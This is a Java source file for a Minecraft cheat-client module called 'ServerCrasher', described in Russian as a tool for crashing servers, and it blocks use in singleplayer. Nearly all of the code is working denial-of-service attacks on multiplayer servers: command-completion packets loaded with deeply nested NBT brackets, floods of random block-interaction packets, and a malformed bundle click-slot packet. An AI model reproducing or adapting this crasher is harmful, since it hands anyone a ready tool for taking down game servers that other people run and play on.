package fun.nexisdlc.modules.impl.player;

import fun.nexisdlc.client.events.impl.client.UpdateEvent;
import fun.nexisdlc.client.utils.eventbus.EventHandler;
import fun.nexisdlc.client.utils.math.time.StopWatch;
import fun.nexisdlc.client.utils.render.color.gradient.GradientUtil;
import fun.nexisdlc.modules.api.Category;
import fun.nexisdlc.modules.api.Function;
import fun.nexisdlc.modules.api.FunctionAdd;
import fun.nexisdlc.modules.api.settings.impl.ModeSetting;
import fun.nexisdlc.modules.impl.render.DanjTags;
import fun.nexisdlc.ui.hud.NotificationsOverlay;
import io.netty.channel.Channel;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.client.MinecraftClient;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.ClientConnection;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.screen.sync.ItemStackHash;

import java.lang.reflect.Field;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

@FunctionAdd(name = "ServerCrasher", alias = "Crasher", category = Category.Utilities, description = "Функция позволяет крашить сервера")
public class ServerCrasher extends Function {

    private static final Random RANDOM = new Random();
    private static StopWatch timerUtil = new StopWatch();
    private static final int COMMAND_PACKETS = 3;
    private static final String NBT_EXECUTOR = " @a[nbt={PAYLOAD}]";
    private static final String[] KNOWN_WORKING_MESSAGES = {
            "msg", "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg",
            "minecraft:teammsg", "minecraft:w", "minecraft:whisper", "minecraft:me",
            "dm", "directmessage", "pm", "privatemessage"
    };
    private static int messageIndex = 0;

    ModeSetting crashType = new ModeSetting("Тип краша", "Командный", "Командный", "Блоки", "Мешочки");
    ModeSetting blockMode = new ModeSetting("Режим блоков", "Быстрый", "Быстрый", "Сбалансированный", "Хитрый");

    public ServerCrasher() {
        addSettings(crashType, blockMode);
    }

    public Channel getChannel(ClientConnection connection) throws Exception {
        Field channelField = ClientConnection.class.getDeclaredField("channel");
        channelField.setAccessible(true);
        return (Channel) channelField.get(connection);
    }

    @EventHandler
    public void onUpdate(UpdateEvent e) {
        if (nullCheck() || mc.player == null || mc.player.networkHandler == null) {
            return;
        }
        if (mc.isInSingleplayer() && this.isState()) toggle();
        Channel channel;
        try {
            channel = getChannel(mc.player.networkHandler.getConnection());
        } catch (Exception ex) {
            return;
        }
        if (channel == null || !channel.isOpen()) {
            return;
        }

        if (crashType.get().equals("Командный")) {
            if (messageIndex == KNOWN_WORKING_MESSAGES.length - 1) {
                messageIndex = 0;
                return;
            }
            String knownMessage = KNOWN_WORKING_MESSAGES[messageIndex] + NBT_EXECUTOR;
            int len = 2044 - knownMessage.length();
            if (timerUtil.isReached(100)) {
                String overflow = generateJsonObject(len);
                String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

                Packet<?> packet = new RequestCommandCompletionsC2SPacket(0, partialCommand);

                for (int i = 0; i < COMMAND_PACKETS; i++) {
                    channel.write(packet);
                }
                channel.flush();
                NotificationsOverlay.push("Успешно отправленно: ["+ len + "bytes]", 1200, NotificationsOverlay.Kind.INFORMATION, "["+ len + "bytes]");
                messageIndex++;
            }

        } else if (crashType.get().equals("Блоки")) {
            int packetCount;
            long delay;
            switch (blockMode.get()) {
                case "Быстрый":
                    packetCount = 12;
                    delay = 15;
                    break;
                case "Сбалансированный":
                    packetCount = 6;
                    delay = 40;
                    break;
                case "Хитрый":
                    packetCount = 3;
                    delay = 80;
                    break;
                default:
                    return;
            }

            if (timerUtil.isReached(delay)) {
                sendBlockOverloadPackets(channel, packetCount);
                if (MinecraftClient.getInstance().inGameHud != null) {
                    MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(
                            GradientUtil.formatMessage("[Server Crasher]", String.format("Отправка %s пакетов блоков", packetCount))
                    );
                }
            }
        } else if (crashType.get().equals("Мешочки")) {
            if (timerUtil.isReached(100)) {
                executeBundleExploit(channel);
                if (MinecraftClient.getInstance().inGameHud != null) {
                    MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(
                            GradientUtil.formatMessage("[Server Crasher]", "Пытаюсь крашнуть сервак через мешочек")
                    );
                }
            }
        }
    }

    private void executeBundleExploit(Channel channel) {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            return;
        }

        ItemStack heldItem = mc.player.getMainHandStack();

        if (!heldItem.isOf(Items.BUNDLE)) {
            if (MinecraftClient.getInstance().inGameHud != null) {
                MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(
                        GradientUtil.formatMessage("[Server Crasher]", "Требуется мешочек в руке!")
                );
            }
            return;
        }

        var bundleContents = heldItem.get(DataComponentTypes.BUNDLE_CONTENTS);
        if (bundleContents == null || bundleContents.isEmpty()) {
            if (MinecraftClient.getInstance().inGameHud != null) {
                MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(
                        GradientUtil.formatMessage("[Server Crasher]", "Мешочек должен содержать предметы!")
                );
            }
            return;
        }

        int slotIdx = mc.player.getInventory().getSelectedSlot() + 36;
        int selected = -1337;

        try {
            Packet<?> clickPacket = new ClickSlotC2SPacket(
                    0,
                    0,
                    (short) slotIdx,
                    (byte) selected,
                    SlotActionType.PICKUP,
                    new Int2ObjectOpenHashMap<>(),
                    ItemStackHash.EMPTY
            );

            Packet<?> interactPacket = new PlayerInteractItemC2SPacket(
                    Hand.MAIN_HAND,
                    0,
                    mc.player.getYaw(),
                    mc.player.getPitch()
            );

            channel.write(clickPacket);
            channel.write(interactPacket);
            channel.flush();

        } catch (Exception e) {
            if (MinecraftClient.getInstance().inGameHud != null) {
                MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(
                        GradientUtil.formatMessage("[Server Crasher]", "Ошибка при выполнении краша: " + e.getMessage())
                );
            }
        }
    }

    private void sendBlockOverloadPackets(Channel channel, int packetCount) {
        BlockPos basePos = mc.player.getBlockPos();
        for (int i = 0; i < packetCount; i++) {
            BlockPos targetPos = new BlockPos(
                    basePos.getX() + RANDOM.nextInt(800) - 400,
                    Math.min(Math.max(basePos.getY() + RANDOM.nextInt(16) - 8, 0), 255),
                    basePos.getZ() + RANDOM.nextInt(800) - 400
            );

            BlockHitResult hitResult = new BlockHitResult(
                    new Vec3d(targetPos.getX() + 0.5, targetPos.getY() + 0.5, targetPos.getZ() + 0.5),
                    Direction.values()[RANDOM.nextInt(Direction.values().length)],
                    targetPos,
                    false
            );

            PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(
                    Hand.MAIN_HAND,
                    hitResult,
                    blockMode.get().equals("Хитрый") ? 0 : -1
            );

            channel.write(packet);
        }
        channel.flush();
    }

    private static String generateJsonObject(int levels) {
        String json = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());
        return "{a:" + json + "}";
    }

    @Override
    public void onEnable() {
        if (MinecraftClient.getInstance().isInSingleplayer()) {
            if (MinecraftClient.getInstance().inGameHud != null) {
                MinecraftClient.getInstance().inGameHud.getChatHud().addMessage(
                        GradientUtil.formatMessage("[Server Crasher]", "Нельзя включить модуль в одиночной игре!")
                );
            }
            setState(false);
            return;
        }
        super.onEnable();
    }
}
